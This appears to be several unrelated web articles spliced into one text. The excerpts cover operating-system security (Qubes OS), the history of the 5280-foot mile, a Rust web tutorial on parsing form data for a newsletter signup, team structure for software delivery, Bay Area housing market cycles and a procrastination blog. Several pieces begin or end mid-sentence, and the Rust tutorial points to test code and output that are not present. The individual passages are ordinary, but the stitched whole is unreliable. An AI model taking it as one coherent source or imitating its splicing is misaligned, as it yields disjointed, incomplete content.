common desktop software. Issues with this one include it is slow, cannot be properly used with a GUI (not that you would want 
to anyway, given how much the Windows command line sucks compared to the one on POSIX/UNIX systems), highly targeted, proprietary, 
costs a lot of money if obtained legally, especially if you want the better versions with more security features and such, and 
is a privacy nightmare out of the box, some of which cannot be disabled in the non-Enterprise/Education versions.</p>
<h2>Qubes OS</h2>
<p><a href="https://www.qubes-os.org/">Qubes OS</a> is actually one of my favorites, and it is what I used to write this post. It has a 
great desktop security model based on isolating different programs into different VMs, good hardware compatibility due to the 
use of a Linux kernel for drivers, and allows you to run instances of the …</p></article></div></div>

The modern mile was defined as 5280 feet under Queen Elizabeth at the end of the 16th century in order to reconcile multiple discordant measurement systems already in wide use. In particular, it was convenient to make it an even multiple of the sides of an acre, which since early medieval times was a rectangle 660 feet long and 66 feet wide. 660 divides neatly into 5280, eight ways, allowing a square mile (640 acres or a “section”) to be conveniently quartered three times over: into quarter sections (160 acres), sixteenth sections (40 acres), and finally the 10 acre squares (660 by 660 feet) that remain at the base of all US land surveys to this day.</p>

<p><em>Background: Many years ago, I became curious as to why, exactly, there are 5280 feet in a mile. The explanations I found online at the time weren’t very convincing. At the time I tried to make some fixes to parts of the puzzle in Wikipedia, but they frequently rejected as OR (original research). Eventually I wrote this article, since revised and updated several times. Since then, my “version” of things will occasionally drift to the #1 spot on Google or Bing, or both, when answering the specific question “why are there 5280 feet in a mile”. More often some SEO-optimized version will slip ahead, though it seems this article is holding steady in the top 3 or 4 at least. So hopefully pretty much everybody who cares about the details will find this. If you have any comments or questions (or corrections), please add to the comment section, I do (eventually) read all comments.<br>
</em></p>
<p><em>I have yet to find an answer to the question that’s as thorough and complete as this one is. But I must caution that this article isn’t really up to academic standards and contains a non-trivial amount of speculation. Caveat Emptor, what follows is my theory of how the mile ended up with 5280 feet.</em></p>
<p>The conventional wisdom on this topic goes something like this: the mile was originally 5000 feet. It was changed to 5280 feet in Elizabethan times around the year 1600 (some point to 1592 and some to 1593) to accommodate the furlong, which was 660 feet. It was easier to fix the mile rather than the furlong for various reasons, hence, eight furlongs and 5280 feet in a mile.</p>
<p>That’s the standard story. It’ll be fleshed out with bells and whistles, including odd theories about horses etc, but that’s about it.</p>
<p>The problem with these versions is that they don’t explain why this collision between furlong and mile occurred around 1600, and not centuries before. It implies, therefore, that people suddenly woke up and realized, hey, wait a second, if there’s 660 feet in a furlong … and eight furlongs in a mile … but 5000 feet in a mile …. wait a second !?!</p>
<p>It somewhat implies that four-digit multiplication was invented ca 1600. Like a lot of rear-view-mirror takes on history, the “explanation” boils down to: “before time X people were stupid about topic Y, and at time Z they wizened up.”</p>
<p>Failing to find a good write-up of the origins, I’ve pieced together my own theory over the years. And it’s a fun one because the answer (or rather, hypothesis) is simply this: the number 5280 arises out of a collision between organized religion, the military, and taxation. Three powerful historical forces, to be sure, so the fourth pillar to modern society (rationality) obviously has to be the one to compromise!</p>
<p>But wait, there’s more: naked Greeks are involved, and Jesus, and Vikings. In that order.</p>
<p>Our story starts with the “original” mile, the Roman one (though there is indication the measurement is older still). The Romans were both practical and militant. Their mile was 1000 paces – a pace being a double step (left foot, right foot) by a soldier in full battle gear. That was a “<em>passus</em>“, and a mile was a “<em>milia passuum</em>“, hence the word “mile” (for “thousand”, as in the word <em>millennium)</em>.</p>
<p>If you are a runner or a hiker, you’ll know that we still remember this information in our convention of relating pedometers to miles: about 2000 steps to a mile. But we have forgotten that it’s not a “trick”, it’s the whole point. Language use changes back and forth over time, and today we’re more likely to use the word “step” rather than “pace”, hence, we can think of a mile as being defined as 2000 steps.</p>
<p>Furthermore, the Romans had another convention, that you’ve probably heard of, which was to place stones next to their roads to mark the distance from Rome. Called “<em>milliarium</em>“, these stone obelisks were first erected along the Via Appia, where milestones dating as far back as the second century BC still survive. Naturally, quite a large number of these stones survived along roads throughout Europe, providing a natural reference point, explaining why their particular measure of a “foot” survives with high accuracy. The central stone in Rome, from which the phrase “all roads lead to Rome” derives, wasn’t erected until some two centuries later in 20 BC, but is since lost.</p>
<p>It’s worth injecting that the popular notion that Roman roads all had measures of the distance from Rome is a myth: only central Italy and a few exceptions were marked from central Rome, all other roads were measured from the nearest local significant center. The US’ attempt to replicate this myth with the Zero Mile marker in Washington, DC, in 1792 would have a similar destiny, influencing only measurements nearby. Instead a similar variation (measuring from something local and significant) lives on in the mile markers of the interstate highway system, where the numbering typically starts at either the southern or the western state line and increasing as you drive in the other direction.</p>
<p>Curiously, we know very little of the details of how the Roman army used the mile as a practical tool – not a single significant military treatise has survived from Roman times. The that has, the <em>Epitoma rei militaris,</em> is unfortunately not considered authoritative. Thus its claims cannot be checked against any other contemporary sources, which is particularly irksome since some of them appear highly dubious – such as stating that the army marched 20 miles in 5 summer hours at regular pace and 24 miles at double pace.</p>
<p>You can experiment yourself to realize that the miles per hour measure is practical for a human: casual walking is 2 mph, an easy walk is 3, swift walking is 4. The available number of hours in a day is similarly small, thus making the mental arithmetic simple.</p>
<p>Hence, 5000 feet to the mile, a general measure that survived throughout Europe as roadside reminders of the might of Rome.</p>
<p>Now, switching tracks, about the furlong. It means “a furrow long” (long as a furrow) and is a practical measure in an agrarian society: it is (approximately) the distance an oxen can plow without resting. That distance was standardized to be 40 “rods”, where a rod (or “pole”) is today defined as 5.5 yards (16.5 feet), though it was probably originally 20 feet (we’ll get back to all this).</p>
<p>An “acre” (which means “field”) was 40 rods long and 4 rods wide (4 rods was also called a “chain”, more on that below). An acre was thus the surface area that one man and a team of oxen could till in one day. It was long and narrow because of the development of the heavy plough around the end of the 10th century, which turned the soil over, revolutionizing agriculture in northern Europe where the clay-heavy soil (vs sandier south European soil) went from being a handicap to an asset, in fact contributing significantly to the eventual inversion of economic power in Europe from the south to the north.</p>
<p>At this point, if you’re paying close attention, you’ll see that not only do we have the decimal (base 10) concept in the “mile” (one thousand paces), but also in the acre: the proportions of the sides are exactly 10:1. That’s because “acre” dates back to “10 square chains”, or an area that’s one “chain” wide and ten long. A “chain” in turn is four rods. The word “chain” comes from how this convenient measurement tool was constructed. Organic materials (wood, rope) have obvious problems in retaining precise dimensions, despite efforts to wax or otherwise treat them. A marked improvement therefore came from carrying a set of thin metal rods, that eventually would be “chained” together. Most surveying in the United States was done in the 1700s and 1800s using a standardized 100-link chain of 66 feet in total length.</p>
<p>But this was a more modern innovation. Going much further back in history it seems likely the basic approach was instead to carry a long, thin, metal “rod” that was 16 feet long, seems likely to me that they were in parts. This is still today a common surveying tool – search Amazon for “surveyor rod” and you’ll find the modern version, now made of telescoping aluminum and generally 16 feet long. We’ll get back to why it was 16 feet (and not 10 or 20), and how it later on became 16.5.</p>
<p>This tradition of the furlong (ten chains) took root in England between the fall of Rome and the Norman conquest of 1066, along the aforementioned adoption of heavy ploughs. With the Normans came the re-introduction of the Roman definition of the foot as 12 inches. A reference foot was thusly carved into one of the pier bases of the new nave in St Paul’s cathedral in London in 1104 (by the son of a banker, interestingly enough).</p>
<p>The Saxon tradition of measuring land had been established in terms of rods, and as we alluded above, probably based on 20 “natural” feet – i.e. not Roman standard feet but “real” 9.8-inch feet. The number 20, of course, was the common “decimal” system prior to the invention of shoes (at which point you can’t see your toes). Also, the technique of counting to 20 with one hand may have been prevalent. Vestiges of base-20 remain, notably for our story, in Danish and French. For example, in French you say “soixante-dix” for 70 and in Danish you say …</p></div></div>

Zero To Production is built around the idea of <a href="https://www.lpalmieri.com/posts/2020-06-21-zero-to-production-2-learn-by-building-an-email-newsletter/">problem-based learning</a>: choose a problem you want to solve, let the problem drive the introduction of new concepts and techniques.<br>
Our problem is <a href="https://www.lpalmieri.com/posts/2020-06-21-zero-to-production-2-learn-by-building-an-email-newsletter/"><em>building an email newsletter</em></a>.</p>
</blockquote>

<p>In the first part of <a href="https://www.lpalmieri.com/posts/2020-08-09-zero-to-production-3-how-to-bootstrap-a-new-rust-web-api-from-scratch/">Chapter 3</a> we covered a fair amount of ground - we set out to implement a <code>/health_check</code> endpoint and that gave us the opportunity to learn more about the fundamentals of our web framework, <a href="https://docs.rs/actix-web/2.0.0/actix_web/"><code>actix-web</code></a>, as well as the basics of (integration) testing for Rust APIs.</p>

<p>It is now time to capitalise on what we learned to finally fulfill the <a href="https://www.lpalmieri.com/posts/2020-06-21-zero-to-production-2-learn-by-building-an-email-newsletter/">first user story of our email newsletter project</a>:</p>

<blockquote>
<p>As a blog visitor,<br>
I want to subscribe to the newsletter,<br>
So that I can receive email updates when new content is published on the blog.</p>
</blockquote>

<p>We expect our blog visitors to input their email address in a form embedded on a web page.<br>
The form will trigger a <code>POST</code> <code>/subscribtions</code> call to our backend API that will actually process the information, store it and send back a response.</p>

<p>We will have to dig into:</p>

<ul>
<li>how to read data collected in a HTML form in <code>actix-web</code> (i.e. how do I parse the request body of a <code>POST</code>?);<br></li>
<li>what libraries are available to work with a PostgreSQL database in Rust (<code>diesel</code> vs <code>sqlx</code> vs <code>tokio-postgres</code>);<br></li>
<li>how to setup and manage migrations for our database;<br></li>
<li>how to get our hands on a database connection in our API request handlers;<br></li>
<li>how to test for side-effects (a.k.a. stored data) in our integration tests;<br></li>
<li>how to avoid weird interactions between tests when working with a database.</li>
</ul>

<p>If all goes well, we should be able to demo the subscription page at the end of the article.<br>
Let’s get started!</p>

<h2 id="2-1-refining-our-requirements">2.1. Refining Our Requirements</h2>

<p>What information should we collect from a visitor in order to enroll them as a subscriber of our email newsletter?</p>

<p>Well, we certainly need their email addresses (it is an <em>email</em> newsletter after all).<br>
What else?</p>

<p>This would usually spark a conversation among the engineers on the team as well as the product manager in your typical business setup. In this case, we are both the technical leads and the product owners so we get to call the shots!</p>

<p>Speaking from personal experience, people generally use throwaway or masked emails when subscribing to newsletters (or, at least, most of you did when <a href="https://www.lpalmieri.com/subscribe/">subscribing to Zero To Production</a>!).<br>
It would thus be nice to collect a <code>name</code> that we could use for our email greetings (the infamous <code>Hey {{subscriber.name}}!</code>) as well as to spot mutuals or people we know in the list of subscribers.<br>
We are not cops, we have no interest in the <code>name</code> field being <em>authentic</em> - we will let people input whatever they feel like using as their identifier in our newsletter system: <a href="https://xkcd.com/979/"><code>DenverCoder9</code></a>, we welcome you.</p>

<p>It is settled then: we want an email address and a name for all new subscribers.</p>

<p>Given that the data is collected via a HTML form, it will be passed to our backend API in the body of a <code>POST</code> request. How is the body going to be encoded?<br>
There are a <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/POST">few options available</a> when using HTML forms: <code>application/x-www-form-urlencoded</code> is the most suitable to our usecase.<br>
Quoting MDN web docs, with <code>application/x-www-form-urlencoded</code></p>

<blockquote>
<p>the keys and values [in our form] are encoded in key-value tuples separated by ‘&amp;‘, with a ‘=’ between the key and the value. Non-alphanumeric characters in both keys and values are percent encoded.</p>
</blockquote>

<p>For example: if the name is <code>Le Guin</code> and the email is <code>ursula_le_guin@gmail.com</code> the <code>POST</code> request body should be <code>name=le%20guin&amp;email=ursula_le_guin%40gmail.com</code> (spaces are replaced by <code>%20</code> while <code>@</code> becomes <code>%40</code> - a reference conversion table can be found <a href="https://www.w3schools.com/tags/ref_urlencode.ASP">here</a>).</p>

<p>To summarise:</p>

<ul>
<li>if a valid pair of name and email is supplied using the <code>application/x-www-form-urlencoded</code> format the backend should return a <code>200 OK</code>;<br></li>
<li>if either name or email are missing the backend should return a <code>400 BAD REQUEST</code>.</li>
</ul>

<h2 id="2-2-capturing-our-requirements-as-tests">2.2. Capturing Our Requirements As Tests</h2>

<p>Now that we understand better what needs to happen, let’s encode our expectations in a couple of integration tests.</p>

<p>Let’s add the new tests to the existing <a href="https://github.com/LukeMathWalker/zero-to-production/blob/master/chapter03-0/tests/health_check.rs"><code>tests/health_check.rs</code> file</a> - we will re-organise our test suite folder structure afterwards.</p>

</div>
</div>
<p><code>subscribe_returns_a_400_when_data_is_missing</code> is an example of <a href="https://github.com/golang/go/wiki/TableDrivenTests"><em>table-driven test</em></a> also known as <em>parametrised test</em>.<br>
It is particularly helpful when dealing with bad inputs - instead of duplicating test logic several times we can simply run the same assertion against a collection of known invalid bodies that we expect to fail in the same way.<br>
With parametrised tests it is important to have good error messages on failures: <code>assertion failed on line XYZ</code> is not great if you cannot tell which specific input is broken! On the flip side, that parametrised test is covering a lot of ground so it makes sense to invest a bit more time in generating a nice failure message.<br>
Test frameworks in other languages sometimes have native support for this testing style (e.g. <a href="https://docs.pytest.org/en/stable/parametrize.html">parametrised tests in <code>pytest</code></a> or <a href="https://andrewlock.net/creating-parameterised-tests-in-xunit-with-inlinedata-classdata-and-memberdata/"><code>InlineData</code> in xUnit for C#</a>) - there are a few crates in the Rust ecosystem that extend the basic test framework with similar features, but unfortunately they do not interop very well with the <code>#[actix_rt::test]</code> macro that we need to write asynchronous tests idiomatically (see <a href="https://github.com/la10736/rstest/issues/85"><code>rstest</code></a> or <a href="https://github.com/frondeus/test-case/issues/36"><code>test-case</code></a>).</p>

<p>Let’s run our test suite now:</p>

</div>
<p>As expected, all our new tests are failing.<br>
You can immediately spot a limitation of “roll-your-own” parametrised tests: as soon as one test case fails, the execution stops and we do not know the outcome for the following tests cases.</p>

<p>Let’s get started on the implementation.</p>

<h2 id="2-3-parsing-form-data-from-a-post-request">2.3. Parsing Form Data From A <code>POST</code> Request</h2>

<p>All tests are failing because the application returns a <code>404 NOT FOUND</code> for <code>POST</code> requests hitting <code>/subscriptions</code>. Legitimate behaviour: we do not have a handler registered for that path.<br>
Let’s fix it by adding a matching route to our <code>App</code> in <code>src/lib.rs</code>:</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

							
<h2>Begin With: Why Do You Need To Build Software?</h2>



<p>There are a many reasons why an organization needs to build and deliver software. Some examples might be:</p>



<ul><li>Grow integrated strategic partnerships</li><li>Improve internal proprietary processes</li><li>Quality assurance and business intelligence</li><li>Build products and tools that customers will use directly</li></ul>



<p>Taking the time to understand the “why” can help you determine how to structure a delivery team and establish long term plans. In many cases an organization may find it has multiple answers to the “why” and this could be a good indicator that a team for each might be a good idea.</p>



<h2>Create Aligned Work Streams vs Functional Groups</h2>



<p><br>Before we can dive into the 4 components that make a delivery team successful, we need to address team structure. For years many organizations structured software development teams by the “how” instead of “why”.&nbsp; For example –&nbsp; QA experts and engineers were divided into groups. I’m sure some of the thought process was to build competency within an organization. Unless you are offering those services directly to customers – your goals shouldn’t be building a stellar “QA” or “Engineering” team. You want a high performing “delivery” teams that just happen to be composed of individuals in these roles. Consider objective first, software creation second. Think diversity of perspectives – putting people with different skill-sets and roles together for a common goal will cultivate continuous improvement.</p>



<h2>The 4 Components</h2>



<p>I’m going to attempt to describe each component and then give examples of ways a team can implement each one. Understand that every organization and workstream may be different – so not all may apply.</p>



<h2><br>Build</h2>



<div><p>Build is traditionally measured by how well your organization can produce technology that can scale, can be maintained cost effectively, and functions consistently.&nbsp; In addition to these considerations I would also include flexibility. A build team that understands how to work iteratively – applying the correct level of technology &amp; effort to deliver what is necessary is key.&nbsp;The ability to produce quality software in a predictable way is the result of multiple aligned efforts.</p><p><strong>Application Portfolio Management &amp; Support:</strong>&nbsp; In order to continue building you have to consider what has been built already. One mistake many organizations make is creating dedicated support teams that are not aligned with a work stream. The result is a disenfranchised team and a pile of technology that eats up resources. A team that doesn’t manage its portfolio will also run into serious tech debt issues – ultimately impacting its ability to deliver. <em>Further Reading: </em><a rel="noreferrer noopener" href="https://spaces.at.internet2.edu/display/itana/TIME+Models" target="_blank">&nbsp;(TIME) Tolerate | Invest | Maintain | Eliminate</a></p></div>



<p><strong>DevOps:</strong> In my mind the greatest contributor to effective delivery is the ability to ship code safely and effortlessly. Thinking back to days when I had to deal with 45 minute builds, complex manual deployment processes, and terrifying testing procedures – this is an easy one in my book. I also believe this is an enabler for organizations with on-prem technology that want to get to the cloud. <em>Further Reading: </em><a rel="noreferrer noopener" href="https://services.google.com/fh/files/misc/state-of-devops-2019.pdf" target="_blank">State Of DevOps (Google)</a></p>



<p><strong>Quality Assurance:</strong> This requires a role that specializes in regression and user acceptance testing. Some of this can also be automated but nothing replaces an individual with domain knowledge that can find bugs. The level of QA necessary for a work stream is dependent on the level of acceptable risk. Ex – financial or healthcare processing will need more QA that a startup still looking for product market fit. <em>Further Reading: </em><a rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/Software_testing_tactics" target="_blank">Software Testing Tactics</a></p>



<p><strong>Software Development: </strong>An obvious component of build – a good development team is critical to executing.&nbsp; Software craftsmanship concepts such as TDD and SOLID are game changers when attempting to deliver high quality software quickly.&nbsp; <em>Further Reading:</em> <a rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/SOLID" target="_blank">SOLID</a><strong> | </strong><a rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/Test-driven_development" target="_blank">TDD</a></p>



<h2>Learn</h2>



<p>You must inform your build effort, otherwise you will produce technology that is of little value (<a rel="noreferrer noopener" href="https://7samurai.dev/2020/08/24/how-to-deliver-meaningful-software/" data-type="post" data-id="20" target="_blank">meaningless</a>). You do this by growing the collective knowledge of the team. It’s important to understand that one person or one role isn’t solely responsible for this on well functioning teams. Every member should have the freedom to contribute. <strong><p>User Experience Research:</p></strong> This role is an absolute must for product focused work streams.&nbsp; Creation of user personas, qualitative &amp; quantitative research, and structured user interviews are all important if an organization wishes to build products that provide real value. This role also places a high emphasis on creating value by understanding the behaviors and needs of users. <em>Further Reading:</em> <a rel="noreferrer noopener" href="http://www.allaboutux.org/ux-definitions" target="_blank">User Experience Definitions&nbsp;</a></p>



<p><strong>Business Analysis:</strong> While UX focuses on users, BA roles tend to focus on business and process.&nbsp; The type of work stream again determines the importance of this role on the team. Business analysts also tend to retain and build domain knowledge. This can be critical as well if your work stream is heavy on complex business processes. Practices such as process mapping and requirements gathering are extremely valuable when dealing with complex workflows and business needs. <em>Further Reading:</em> <a href="https://www.adb.org/sites/default/files/publication/27641/five-whys-technique.pdf" target="_blank" rel="noreferrer noopener">5 Whys </a><strong>&nbsp;| </strong><a href="https://en.wikipedia.org/wiki/MoSCoW_method" target="_blank" rel="noreferrer noopener">MoSCoW</a></p>



<p><br><strong>Technical Analysis &amp; Design:</strong> Commonly misunderstood or ignored this role is a must have on teams that maintain and enhance large systems or a large number of applications. Sometimes domain knowledge lives within code and the only way to re-discover requires a deep dive into the code.&nbsp; In most cases this needs to be an experienced developer who can translate code into requirements (or at minimum technical specifications). Some organizations attempt to avoid this by producing large volumes of documentation – in many cases it’s not a viable solution.&nbsp; <em>Further Reading:</em> <a href="https://www.mountaingoatsoftware.com/blog/not-everything-needs-to-be-a-user-story-using-fdd-features" target="_blank" rel="noreferrer noopener">Using FDD Features</a></p>



<h2>Promote</h2>



<p>Once you build something you need to ensure that its value is understood by stakeholders and users. I consider this effort one of the 4 pillars because without it you don’t receive feedback or traction. Unused software is meaningless software – even if it “could” offer value. There is strong overlap in this area with general sales and marketing but this is outside the scope of “software delivery”.</p>



<div><p><strong>Demos</strong>: One way you can promote internally is via “Demo Days”. Showing new functionality to stakeholders and team members creates conversations which generates internal feedback loops. This ensures that everyone understands the value. Also, this also offers an opportunity to team members who wish to build communication and speaking skills. <em>Further Reading:</em> <a href="https://dev.acquia.com/blog/how-to-give-a-great-agilescrum-sprint-demo/09/08/2018/19771" target="_blank" rel="noreferrer noopener">How to Give a Great Agile/Scrum Sprint Demo</a></p><p><strong>Roadmaps</strong>:&nbsp; Communicating the direction of the team to the organization is important. Hopefully it can provide a source of excitement and inspiration for the entire organization. A well communicated roadmap in conjunction with a good company culture should result in aligned efforts and a shared vision.&nbsp; <em>Further Reading:</em>&nbsp; <a href="https://docs.google.com/presentation/d/1HReut5aIndOczY3sD6JQhowRIrmp44RcvjnT28mzfBM/edit#slide=id.g23c0d64254_0_16" target="_blank" rel="noreferrer noopener">Department Of Product: Roadmaps</a><br><strong><br>Customer Experience</strong>: Ensuring that customers can easily understand and utilize features the team has created – in conjunction with the offering as a whole ensures that engagement can scale as the product becomes more complex (and/or integrated).&nbsp; I consider this “promotion” because creating a good customer experience is a form of promoting the underlying value provided by the platform.&nbsp; <em>Further Reading:</em> <a href="https://www.nngroup.com/articles/ux-vs-cx/" target="_blank" rel="noreferrer noopener">User Experience vs. Customer Experience</a></p></div>



<h2>Core</h2>



<p>Now we get to the really fun part. Putting it all together. While the other 3 components can vary based on organizational structure and work stream needs – these items are non-negotiable if you wish to successfully deliver meaningful software.</p>



<p><strong>Ownership:&nbsp;</strong> Without strategic direction a team is very likely to focus on small items that don’t line up with larger objectives (although I do think it’s possible for teams to become aligned – a topic for another time). Decision makers need to be responsible for collecting information from all 3 components, weave in considerations from leadership, and set a course. Among the many decisions to be made lies the most critical – platform and feature prioritization.&nbsp; <em>Further Reading:</em> <a href="http://agilemodeling.com/essays/productOwner.htm" target="_blank" rel="noreferrer noopener">A Stakeholder Proxy for Agile Teams</a></p>



<p><strong>Continuous Improvement:</strong>&nbsp; A team that wants to deliver meaningful software must strive to be better on both a team and individual level. The only way this works however is if the team defines and measures continuous improvement goals on its own. An autonomous team that has the freedom to test (and fail) in an effort to improve will produce consistently better results long term. <em>Further Reading:</em> <a href="https://retromat.org/en/?id=43-133-10-73-60" target="_blank" rel="noreferrer noopener">RetroMat</a></p>



<p><strong>Work Agreements:</strong> Informed by continuous improvement, this can include work visualization, code quality practices, ceremonies, definition of done, and other “contracts” among team members. The importance of mutually agreed upon expectations is it removes frustration from the day to day. A good example of this is user stories. A great format for collecting requirements and managing the work – but the real value is its ability to transfer knowledge among multiple team members and roles in a well understood format. Add the ability to visualize priority and progress and the team finds itself aligned. Also keep in mind, while the agreements may be rigid in  definition your continuous improvement efforts should allow for them to change easily when necessary. <em>Further Reading:</em> <a href="https://tech.gsa.gov/guides/Agile_Meetings_Goals_and_Benefits/" target="_blank" rel="noreferrer noopener">Agile Meetings – Goals and Benefits </a>| <a href="https://www.atlassian.com/agile/kanban/kanban-vs-scrum" target="_blank" rel="noreferrer noopener">Kanban vs. Scrum</a></p>

<p>Below is a look at the past 30+ years of San Francisco Bay Area real estate boom and bust cycles. Financial-market cycles have been around for hundreds of years, all the way back to the Dutch tulip mania of the 1600’s. While future cycles will vary in their details, the causes, effects and trend lines are often quite similar. Looking at cycles gives us more context to how the market works over time and where it may be going — much more than dwelling in the immediacy of the present with excitable pronouncements of “The market’s crashing and won’t recover in our lifetimes!” or “The market’s crazy hot and the only place it can go is up!”</p>
<p>Note: Most of these charts generally apply to higher-priced Bay Area housing markets, such as those found in much of San Francisco, Marin, Central Contra Costa (Lamorinda &amp; Diablo Valley) and San Mateo Counties. (Different market price segments had bubbles, crashes – or adjustments – and recoveries of differing magnitudes in the last cycle, which is addressed at the end of this report.)</p>
<p><u>Regardless of how recent cycles have played out, it is vital to understand how extremely difficult it is to predict, with any accuracy, when different parts of a cycle will begin or end.</u>&nbsp;Boom times can go on much longer than expected, or get second winds; recessions or crashes can appear with startling suddenness. It should also be noted that all of the major down cycles in the Bay Area in recent decades have been tied to national or international economic factors, i.e. our cycles aren’t simply local events, separated from the rest of the state or country. However, it is true that local factors sometime exacerbate a downturn (the earthquake of 1989; our greater exposure to the dotcom bubble), or supercharge a recovery (the Bay Area high-tech boom of recent years).</p>

Whatever the phase of the cycle, up or down, while it is going on people think it will last forever. Going up, it’s never going to stop! And then every time the market goes down, the consensus becomes that real estate will not recover for decades (or even “in our lifetimes”). But the economy mends, the population grows, people start families, inflation builds up over the years, and repressed demand of those who want to own their own homes builds up. In the early eighties, mid-nineties and in 2012, after about 4 years of a recessionary housing market, this repressed demand jumped back in (or “explodes” might be a good description) and prices started to rise again. (The dotcom bubble adjustment caused no lasting recession in home values.)</p>
<p>It’s not unusual for a big surge in values to occur in the first couple of years after a recovery begins, often quickly exceeding the previous peak value.</p>
<p>All bubbles are ultimately based on irrational exuberance and/or criminal behavior, whether exemplified by junk bonds, Savings &amp; Loan frauds, dotcom stock hysteria, “Dow 30,000” insanity, “the end of the business cycle” nonsense, gorging on unsustainable debt, runaway greed (without any corresponding desire to produce anything of value), predatory lending, or dishonest financial engineering.</p>
<p>However, it should be noted that the most recent subprime-financing/ loan-fraud bubble was truly abnormal in its scale, and its crash was much greater than other “market adjustments” going back many decades. The pre-2008 bubble was fueled by tens of millions of buyers purchasing (or owners refinancing) homes with loans that they clearly&nbsp;<em>couldn’t afford</em>&nbsp;right from the get go: Liar loans, deceptive teaser rates, promises of non-stop appreciation, and the abysmal decline in underwriting standards. (Since lenders were simply selling the loans, they didn’t care about qualifying buyers anymore.) Sometimes there was no actual investment in the properties being bought, i.e. no down payment, 100%+ loans. Many lenders and mortgage brokers clearly engaged in criminally predatory behavior, convincing people to overload themselves with unsustainable, impossible-to-pay-back levels of debt. (Sadly, something similar has been going on in recent years with college loans.)</p>
<p>The market adjustments of the early 1990’s and that subsequent to the dotcom bubble saw declines in home values in the range of 10% to 11%, which is of a&nbsp;<em>completely different scale</em>&nbsp;from the recent 2008 – 2011 crash and decline, when values plunged by up to 60% around the state and country, depending on area and price segment. The previous crash of a similar magnitude was during the Great Depression of the 1930’s.</p>
<p><u>This is important context when contemplating the next adjustment</u>: It doesn’t have to be a devastating crash. It can be more like some air being let out of an over-pressurized tire instead of a blowout on the highway at high speed. As of early-2017, it appears that the SF economy and housing market have cooled to some degree after 4 years of feverish appreciation. But the change varies by segment: The affordable house segment remains quite hot; more expensive house prices have generally plateaued; the condo market has cooled much more and seen price declines, and the luxury condo market has cooled the most. The condo market has been affected by the surge of new-construction condos hitting the market recently. We will have to wait and see the scale and speed of any further adjustment, but so far, we don’t see local or macro-economic conditions for a 2008-like crash. Adjustment, yes; devastating crash, no.

<p>The light blue columns in the above chart graph the home-value appreciation that occurred in the&nbsp;<u>first three years</u>&nbsp;of each recovery – our latest rebound has been somewhat quicker than other recoveries, probably due to 1) the depth of the previous market decline, and 2) the huge, high-tech employment, population and wealth boom that has played out in San Francisco and nearby counties. The gray columns chart the appreciation of past recoveries from the beginning to&nbsp;<em>peak value</em>&nbsp;for each cycle (except for the latest cycle, for which the peak has not yet been defined), and the red bars delineate the percentage declines from those peaks, pursuant to the market adjustments that occurred. As always, note that market appreciation and depreciation rates can vary widely by county, community and neighborhood.</p>
<p>Over the past 30+ years, the period between a recovery beginning and a bubble popping (or a lesser adjustment occurring) has run 5 to 7 years. We are currently about 5 years into the current recovery, which started in early 2012 (in San Francisco; later in outlying Bay Area counties). Periods of market recession/doldrums following the popping of a bubble have typically lasted about 3-4 years. (The 2001 dotcom bubble/ 9-11 crisis drop being the exception.) Generally speaking, within about 2-3 years of a new recovery commencing, previous peak values (i.e. those at the height of the previous bubble) are re-attained — among other reasons, there is the recapture of inflation during the doldrums years. In this current recovery, those homes hit hardest by the subprime loan crisis — typically housing at the lowest end of the price scale in the less affluent neighborhoods, which experienced by far the biggest bubble and biggest crash — are appreciating quickly now, but taking longer to re-attain peak values. However, communities with higher priced homes — such as in San Francisco, Marin, San Mateo and Central Contra Costa Counties (Diablo Valley &amp; Lamorinda) — have surged well past their previous peaks.</p>
<p>This does not mean that these recently recurring time periods necessarily reflect some natural law in housing market cycles, or that they can be relied upon to predict the future. Real estate markets can be affected by a bewildering number of local, national and international economic, political and even natural-event factors that are exceedingly difficult or even impossible to predict with any accuracy.</p>
<p>In the 2 charts below tracking the S&amp;P Case-Shiller Home Price Index for the 5-County San Francisco Metro Area, the data points refer to home values as a percentage of those in January 2000. January 2000 equals 100 on the trend line: 66 means prices were 66% of those in January 2000; 175 signifies prices 75% higher.</p>

<p>In the above chart, the country is just coming out of the late seventies, early eighties recession featuring terrible inflation, stagnant economy (“stagflation”) and incredibly high interest rates (hitting 18%). As the economy recovered, the housing market started to appreciate and this surge in values began to accelerate deeper into the decade. Over 6 years, the market appreciated about 100%. Finally, the late eighties “Greed is good!” version of irrational exuberance — junk bonds, stock market swindles, the Savings &amp; Loan implosion, as well as the late 1989 earthquake here in the Bay Area — ended the party.</p>
<p>Recession arrived, home prices sank about 11%, sales activity plunged and the market stayed basically flat for 4 to 5 years. Still, even after the decline, home values were 70% higher than when the boom began in 1984.</p>

<p><i>Me when I have something more important I need to do</i></p>

<p>I am a serial procrastinator. If I have something I want to do, like work on a side project or write something, I will find ways to anything else except that. I go through phases where I can keep myself somewhat focused, but I always seem to drift back into my old bad habits after awhile. Recently though, I’ve started finding ways to turn this procrastination time into something better, what I’ll call “productive procrastination”.</p>

<p>My usual activity when I’m wasting time is watching people play video games on Twitch, or just watching whatever comes up in my Youtube feed. This time is completely useless. I don’t learn any new skills, I don’t grow as a person, and I can’t even discuss it later with friends because nobody I know watches this stuff. This is just pure time annihilation, that time just disappears from my life leaving me nothing to show for it, as if it never existed to begin with.</p>

<p>Recently, I’ve started finding ways to channel my brain’s craving for distraction and avoidance into activities that <em>do</em> have some benefits. I’d still rather I could stay focused on what I want to work on, but this time it isn’t a complete waste, and might even have the potential to be life-changing. My new addictions are learning Ukulele and cycling, although not at the same time (yet!).</p>

<p>My newfound love of Ukulele came as a real surprise to me. My girlfriend bought me a cheap Ukulele about a month ago almost as a joke gift, and I started watching some Youtube videos to see if I could at least learn how to to play something really basic. I’ve never played a musical instrument before, and I always assumed I just never would. Growing up there were people who did music, and those who didn’t, and I was always firmly in the latter camp. But for whatever reason, I’ve found Ukulele really addicting. Whenever I feel that wall of mental resistance to doing the task at hand, I just pick up the Ukulele and start trying to learn some new chords, or try playing a new song. It’s a perfect size to be able to just have next to me whenever I’m at my apartment, and I can see progress really quickly. Most importantly, my brain treats it as a fun distraction, so I’ve been able to sneak Ukulele practice in instead of my usual binge Twitch watching. Now while I’m procrastinating I’m learning a real skill, and feel like there’s a whole world of music that might be just around the corner if I keep it up. Who knows, maybe I could even join a band someday!</p>

